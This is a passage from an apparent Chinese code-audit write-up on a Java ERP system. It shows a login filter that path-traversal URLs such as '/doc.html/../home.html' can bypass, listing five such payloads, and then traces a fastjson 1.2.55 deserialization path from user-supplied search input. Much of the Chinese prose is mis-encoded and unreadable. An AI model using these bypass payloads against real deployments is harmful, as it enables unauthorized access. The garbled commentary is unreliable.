class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//å…·ä½“ï¼Œæ¯”å¦‚ï¼šå¤„ç†è‹¥ç”¨æˆ·æœªç™»å½•ï¼Œåˆ™è·³è½¬åˆ°ç™»å½•é¡µ</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//å¦‚æœå·²ç™»å½•ï¼Œä¸é˜»æ­¢</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//æœªç™»å½•æ—¶å…è®¸è®¿é—®çš„é¡µé¢</span><br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>                                   requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// ignoredList</span><br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// allowUrls</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//if æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œé‡å®šå‘åˆ° /login.html</span><br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿‡æ»¤é€»è¾‘ï¼š</p>
<ul>
<li>æ”¾è¡Œï¼š<ul>
<li>Session ä¸­æœ‰ user</li>
<li>è®¿é—® <code>/doc.html</code> <code>/register.html</code> <code>/login.html</code>   </li>
<li>ignoredList  é™æ€èµ„æº</li>
<li>allowUrls     &#x2F;user&#x2F;login   &#x2F;user&#x2F;registerUser    &#x2F;v2&#x2F;api-docs</li>
</ul>
</li>
<li>å…¶ä»–å…¨éƒ¨é‡å®šå‘åˆ° &#x2F;login.html</li>
<li>ç¼ºé™·ï¼š<ul>
<li>è™½ç„¶æœ‰ç™½åå•ï¼Œä½†è·¯å¾„åŒ¹é…ä¸å®Œæ•´ï¼Œå¦‚æœåœ¨ url ä¸­æ„å»ºå¦‚ï¼š1.css&#x2F;..&#x2F;index.html  doc.html&#x2F;..&#x2F;index.html ç­‰ï¼Œå°±ä¼šç»•è¿‡</li>
</ul>
</li>
</ul>
<p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">/doc.html/../home.html<br>/register.html/../home.html<br>/login.html/../home.html<br>/1.css/../home.html<br>/user/login/../../home.html<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>æ³¨æ„ï¼š</strong></p>
<p>è¿™æŠ“åŒ…ä¸­æœ‰æ—¶ä¼šæŠ“åˆ°è¿™æ ·ä¸€è¡Œæ•°æ®ï¼š If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT  </p>
<p>è¿™æ˜¯æµè§ˆå™¨çš„æœ¬åœ°ç¼“å­˜ï¼Œå¦‚æœè¿™ä¸ªèµ„æºè‡ªè¿™ä¸ªæ—¶é—´ç‚¹ä¹‹åæ²¡æœ‰ä¿®æ”¹ï¼Œå°±è¿”å›304</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png" srcset="/img/loading.gif" lazyload></p>
<p>æŠŠè¿™ä¸ªå»æ‰å°±å¯ä»¥æ­£å¸¸æ³¨å…¥äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="2ã€pom-xml-Maven-ä¾èµ–"><a href="#2ã€pom-xml-Maven-ä¾èµ–" class="headerlink" title="2ã€pom.xml - Maven ä¾èµ–"></a>2ã€pom.xml - <strong>Maven ä¾èµ–</strong></h2><h3 id="2-1-fastjson-1-2-55-ååºåˆ—åŒ–æ¼æ´"><a href="#2-1-fastjson-1-2-55-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="2.1 fastjson-1.2.55-ååºåˆ—åŒ–æ¼æ´"></a>2.1 fastjson-1.2.55-ååºåˆ—åŒ–æ¼æ´</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png" srcset="/img/loading.gif" lazyload></p>
<p>å…¥å£ç‚¹ï¼šparseObject</p>
<p>**å…¨å±€æœç´¢ parseObject **ï¼Œæ‰¾ä¸€ä¸ªå¸¦æœ‰å¯æ§å˜é‡çš„ç‚¹</p>
<p>æ‰¾åˆ° src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsh&#x2F;erp&#x2F;utils&#x2F;StringUtil.java ä¸­æœ‰åˆ©ç”¨ç‚¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="åˆ†æé“¾ï¼š"><a href="#åˆ†æé“¾ï¼š" class="headerlink" title="åˆ†æé“¾ï¼š"></a>åˆ†æé“¾ï¼š</h4><hr>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-comment">//è¿”å›å€¼åˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸²</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//åˆ¤æ–­ search æ˜¯å¦ä¸ºç©º</span><br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">//å°† search è§£æä¸º JSONObject</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>        <span class="hljs-comment">//ä» JSONObject å–ä¸€ä¸ª key å¹¶è½¬åŒ–ä¸º String</span><br>        value = obj.getString(key);<br>        <span class="hljs-comment">//å¦‚æœå–åˆ°ç©ºå­—ç¬¦ä¸²ï¼Œvalue = null;</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">JSONObject.parseObject</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br><span class="hljs-comment">//è°ƒç”¨äº† parse æ–¹æ³•ï¼ŒæŠŠ text è§£ææˆä¸€ä¸ª Java å¯¹è±¡</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br><span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>    <span class="hljs-keyword">return</span> (JSONObject) obj;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">parse(String text)</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-comment">//è°ƒç”¨äº†å¦ä¸€ä¸ª parse</span><br>    <span class="hljs-keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">parse(String text, int features)</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-comment">//å¼•å…¥äº† ParserConfig.getGlobalInstance() æ–¹æ³•</span><br>    <span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› parse(String text, ParserConfig config, int features)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>        <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-comment">//è§£æ JSON</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">DefaultJSONParser</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String input, <span class="hljs-keyword">final</span> ParserConfig config, <span class="hljs-type">int</span> features)</span>&#123;<br>    <span class="hljs-comment">//åˆ›å»º JSONScanner ï¼Œä¼ ç»™ä¸‹ä¸€ä¸ªæ ¸å¿ƒæ„é€ å™¨</span><br>    <span class="hljs-built_in">this</span>(input, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONScanner</span>(input, features), config);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">DefaultJSONParser</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object input, <span class="hljs-keyword">final</span> JSONLexer lexer, <span class="hljs-keyword">final</span> ParserConfig config)</span>&#123;<br>    <span class="hljs-comment">//lexerï¼šè¯æ³•åˆ†æå™¨ã€‚</span><br>    <span class="hljs-built_in">this</span>.lexer = lexer;<br>    <span class="hljs-comment">//ç”¨æˆ·è¾“å…¥çš„ JSON å­—ç¬¦ä¸²</span><br>    <span class="hljs-built_in">this</span>.input = input;<br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-built_in">this</span>.symbolTable = config.symbolTable;<br><br>    <span class="hljs-comment">//è·å– JSON è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç”¨äºåˆ¤æ–­ JSON çš„ç±»å‹ï¼š&#123; å¯¹è±¡ï¼›[ æ•°ç»„ï¼›å…¶ä»–ï¼ˆæ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”ç­‰ï¼‰</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> lexer.getCurrent();<br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>        lexer.next();<br>        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        lexer.nextToken(); <span class="hljs-comment">// prime the pump</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong><font style="color:rgb(34, 34, 38);">lexerï¼ˆè¯æ³•åˆ†æå™¨ï¼‰ä¸ parserï¼ˆè¯­æ³•åˆ†æå™¨ï¼‰</font></strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/buguge/article/details/147525215"><strong>https://blog.csdn.net/buguge/article/details/147525215</strong></a></p>
<p><strong><font style="color:rgb(77, 77, 77);">è¯æ³•åˆ†æå™¨(Lexer)å’Œè¯­æ³•åˆ†æå™¨(Parser)</font></strong><font style="color:rgb(77, 77, 77);">æ˜¯ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶ï¼Œå®ƒä»¬ååŒå·¥ä½œå°†åŸå§‹è¾“å…¥(å¦‚JSONå­—ç¬¦ä¸²ã€ä»£ç æ–‡ä»¶)è½¬æ¢ä¸ºç»“æ„åŒ–æ•°æ®(å¦‚å¯¹è±¡ã€æŠ½è±¡è¯­æ³•æ ‘)</font></p>
</blockquote>
<p>è¿”å›ä¸€æ­¥ï¼ŒObject value &#x3D; parser.parse();   è·Ÿè¿› parse()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(Object fieldName)</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.lexer;<br><span class="hljs-keyword">switch</span> (lexer.token()) &#123;<br>    ...<br>    <span class="hljs-keyword">case</span> LBRACE:<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));<br>        <span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>    ...<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› parseObject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br></code></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªç±»ä¸­æ‰¾æˆ‘ä»¬éœ€è¦çš„å¤„ç† @type çš„éƒ¨åˆ†ï¼Œæœç´¢  checkAutoType</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JSON.DEFAULT_TYPE_KEY å³ @type</span><br><span class="hljs-keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">typeName</span> <span class="hljs-operator">=</span> lexer.scanSymbol(symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br><br>    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› checkAutoType</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br></code></pre></td></tr></table></figure>

<p>æ¥åˆ°è¿™ä¸ªç±»ä¸­ï¼ŒæŒ‰ç…§ä¹‹å‰ç‰ˆæœ¬çš„ç»éªŒï¼Œä¸‹ä¸€æ­¥æœ‰ä¸ª <font style="color:rgb(51, 51, 51);">TypeUtils.loadClass ï¼Œç»§ç»­æœç´¢</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (autoTypeSupport || expectClassFlag) &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> h3;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>        hash ^= className.charAt(i);<br>        hash *= PRIME;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› TypeUtils.loadClass</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) &#123;<br>    <span class="hljs-keyword">if</span>(className == <span class="hljs-literal">null</span> || className.length() == <span class="hljs-number">0</span> || className.length() &gt; <span class="hljs-number">128</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ä¸‹ä¸€æ­¥æ‰§è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><span class="hljs-keyword">if</span>(deserializer != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(object);<br>    <span class="hljs-keyword">return</span> (T) JSON.parseObject(json, clazz);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><font style="color:rgb(51, 51, 51);">åœ¨æ‰§è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨å®ä¾‹åŒ–çš„ç±»ï¼Œæ‰§è¡Œåç»­å‘½ä»¤</font></p>
<p><font style="color:rgb(51, 51, 51);"></font></p>
<p>æ¥ä¸‹æ¥åº”è¯¥æ‰¾<strong>è°ƒç”¨ StringUtil#getInfo æ–¹æ³•</strong>çš„åœ°æ–¹</p>
<p>çœ‹äº†å‚è€ƒæ–‡ç« æ‰¾åˆ° <font style="color:rgb(51, 51, 51);">UserComponent</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//æ¥æ”¶åˆ°å‰ç«¯ä¼ çš„ Map&lt;String,String&gt;ï¼ŒåŒ…å« search </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> QueryUtils.filter(map);<br>    <span class="hljs-keyword">return</span> userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ‰¾ getUserList çš„è°ƒç”¨åœ°æ–¹ï¼Œè¿™æ—¶åº”è¯¥æ‰¾çš„æ˜¯æ§åˆ¶å™¨é‡Œçš„æ–¹æ³•äº†</p>
<blockquote>
<p>å‡ ä¸ªè¸©å‘çš„åœ°æ–¹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ‘ä»¬è¦æ³¨æ„ï¼ŒçœŸæ­£åº”è¯¥è°ƒç”¨çš„æ˜¯ <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map)ï¼Œè€Œä¸Šé¢çš„éƒ½ä¸æ˜¯æ­£ç¡®è°ƒç”¨</font></p>
</blockquote>
<p>æ‰¾åˆ°çœŸæ­£è°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">getUserList(Map&lt;String, String&gt; map) çš„åœ°æ–¹</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png" srcset="/img/loading.gif" lazyload></p>
